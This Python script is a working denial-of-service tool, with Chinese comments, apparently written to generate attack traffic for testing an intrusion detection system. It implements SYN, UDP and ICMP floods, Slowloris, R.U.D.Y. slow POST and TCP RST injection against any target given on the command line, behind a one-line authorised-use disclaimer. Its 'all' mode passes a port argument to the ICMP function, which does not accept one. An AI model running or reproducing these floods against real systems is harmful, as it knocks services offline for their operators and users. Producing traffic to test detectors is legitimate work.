#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DoS 拒绝服务攻击脚本（6种攻击方式）
====================================

包含：SYN Flood、UDP Flood、ICMP Flood、Slowloris、R.U.D.Y.、TCP RST

用法：
  python dos_attack.py --target <IP> --attack <syn_flood|udp_flood|icmp_flood|slowloris|rudy|tcp_rst|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import threading
import sys
from config import TARGET_IP, TARGET_PORT, ATTACK_DURATION
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort, RandIP, conf

conf.verb = 0


# ========== 1. SYN Flood ==========
def syn_flood(target, port=80, duration=30, pps=500):
    """
    SYN洪水攻击：高速发送大量SYN包，耗尽目标半开连接资源
    特征：海量SYN包，无完成握手
    """
    print(f"[SYN Flood] 目标={target}:{port}, 持续={duration}s, PPS={pps}")
    end_time = time.time() + duration
    count = 0
    # 使用固定源端口池，使NIDS能累积流特征
    sport_pool = [random.randint(40000, 50000) for _ in range(5)]
    while time.time() < end_time:
        sport = random.choice(sport_pool)
        pkt = IP(dst=target) / TCP(sport=sport, dport=port, flags="S", seq=random.randint(0, 2**32-1))
        send(pkt, count=min(pps, 100), inter=0)
        count += min(pps, 100)
        time.sleep(max(0, 1.0 / (pps / 100)))
    print(f"[SYN Flood] 完成，共发送 {count:,} 个SYN包")


# ========== 2. UDP Flood ==========
def udp_flood(target, port=53, duration=30, pps=500):
    """
    UDP洪水攻击：发送大量随机UDP数据包，耗尽目标带宽和处理资源
    特征：大量UDP包，随机源端口，随机负载
    """
    print(f"[UDP Flood] 目标={target}:{port}, 持续={duration}s, PPS={pps}")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        payload = bytes(random.getrandbits(8) for _ in range(random.randint(64, 1024)))
        pkt = IP(dst=target) / UDP(sport=RandShort(), dport=port) / Raw(load=payload)
        send(pkt, count=min(pps, 100), inter=0)
        count += min(pps, 100)
        time.sleep(max(0, 1.0 / (pps / 100)))
    print(f"[UDP Flood] 完成，共发送 {count:,} 个UDP包")


# ========== 3. ICMP Flood (Ping Flood) ==========
def icmp_flood(target, duration=30, pps=500):
    """
    ICMP洪水攻击（Ping Flood）：发送大量ICMP Echo Request
    特征：海量ICMP包，大负载
    """
    print(f"[ICMP Flood] 目标={target}, 持续={duration}s, PPS={pps}")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        payload = bytes(random.getrandbits(8) for _ in range(1024))
        pkt = IP(dst=target) / ICMP(type=8, code=0) / Raw(load=payload)
        send(pkt, count=min(pps, 100), inter=0)
        count += min(pps, 100)
        time.sleep(max(0, 1.0 / (pps / 100)))
    print(f"[ICMP Flood] 完成，共发送 {count:,} 个ICMP包")


# ========== 4. Slowloris ==========
def slowloris(target, port=80, sockets_count=200, duration=60):
    """
    Slowloris慢速攻击：建立大量HTTP连接但不完成请求，保持连接占用
    特征：大量半完成HTTP连接，周期性发送不完整Header
    """
    print(f"[Slowloris] 目标={target}:{port}, 连接数={sockets_count}, 持续={duration}s")
    socket_list = []

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            return s
        except Exception:
            return None

    # 初始化连接
    print(f"[Slowloris] 建立 {sockets_count} 个初始连接...")
    for _ in range(sockets_count):
        s = create_socket()
        if s:
            socket_list.append(s)
    print(f"[Slowloris] 成功建立 {len(socket_list)} 个连接")

    end_time = time.time() + duration
    while time.time() < end_time:
        # 发送不完整Header保持连接
        for s in list(socket_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                socket_list.remove(s)
                new_s = create_socket()
                if new_s:
                    socket_list.append(new_s)
        time.sleep(15)  # 每15秒发一次保活

    # 清理
    for s in socket_list:
        try:
            s.close()
        except Exception:
            pass
    print(f"[Slowloris] 完成，维持了 {duration}s 的连接占用")


# ========== 5. R.U.D.Y. (R-U-Dead-Yet) ==========
def rudy(target, port=80, duration=60, connections=50):
    """
    R.U.D.Y.慢速POST攻击：发送极慢的HTTP POST数据，占用服务器连接
    特征：HTTP POST，Content-Length极大但数据发送极慢
    """
    print(f"[R.U.D.Y.] 目标={target}:{port}, 连接数={connections}, 持续={duration}s")

    def slow_post():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            content_length = random.randint(10000, 100000)
            s.send(f"POST / HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(f"Content-Type: application/x-www-form-urlencoded\r\n".encode())
            s.send(f"Content-Length: {content_length}\r\n".encode())
            s.send("\r\n".encode())
            end_time = time.time() + duration
            while time.time() < end_time:
                s.send(f"a={random.randint(0,9)}".encode())
                time.sleep(random.uniform(5, 15))
            s.close()
        except Exception:
            pass

    threads = []
    for _ in range(connections):
        t = threading.Thread(target=slow_post, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=duration + 5)
    print(f"[R.U.D.Y.] 完成，{connections} 个慢速POST连接已结束")


# ========== 6. TCP RST 攻击 ==========
def tcp_rst(target, port=80, duration=30, pps=200):
    """
    TCP RST攻击：发送RST包断开目标连接
    特征：大量RST标志包
    """
    print(f"[TCP RST] 目标={target}:{port}, 持续={duration}s, PPS={pps}")
    end_time = time.time() + duration
    count = 0
    sport_pool = [random.randint(40000, 50000) for _ in range(5)]
    while time.time() < end_time:
        sport = random.choice(sport_pool)
        pkt = IP(dst=target) / TCP(
            sport=sport, dport=port, flags="R",
            seq=random.randint(0, 2**32-1)
        )
        send(pkt, count=min(pps, 50), inter=0)
        count += min(pps, 50)
        time.sleep(max(0, 1.0 / (pps / 50)))
    print(f"[TCP RST] 完成，共发送 {count:,} 个RST包")


# ========== 主入口 ==========
ATTACK_MAP = {
    "syn_flood": ("SYN Flood洪水攻击", syn_flood),
    "udp_flood": ("UDP Flood洪水攻击", udp_flood),
    "icmp_flood": ("ICMP Flood洪水攻击", icmp_flood),
    "slowloris": ("Slowloris慢速攻击", slowloris),
    "rudy": ("R.U.D.Y.慢速POST攻击", rudy),
    "tcp_rst": ("TCP RST攻击", tcp_rst),
}

def main():
    parser = argparse.ArgumentParser(description="DoS攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="syn_flood",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=80, help="目标端口")
    parser.add_argument("--duration", "-d", type=int, default=30, help="持续时间(秒)")
    parser.add_argument("--pps", type=int, default=500, help="每秒包数")
    args = parser.parse_args()

    print(f"{'='*60}")
    print(f"DoS 拒绝服务攻击工具 - 御链天鉴")
    print(f"目标: {args.target}:{args.port}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            print(f"\n--- {name} ---")
            if key in ("slowloris", "rudy"):
                func(args.target, port=args.port, duration=min(args.duration, 30))
            else:
                func(args.target, port=args.port, duration=args.duration, pps=args.pps)
            time.sleep(2)
    else:
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} ---")
        if args.attack in ("slowloris", "rudy"):
            func(args.target, port=args.port, duration=args.duration)
        else:
            func(args.target, port=args.port, duration=args.duration, pps=args.pps)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
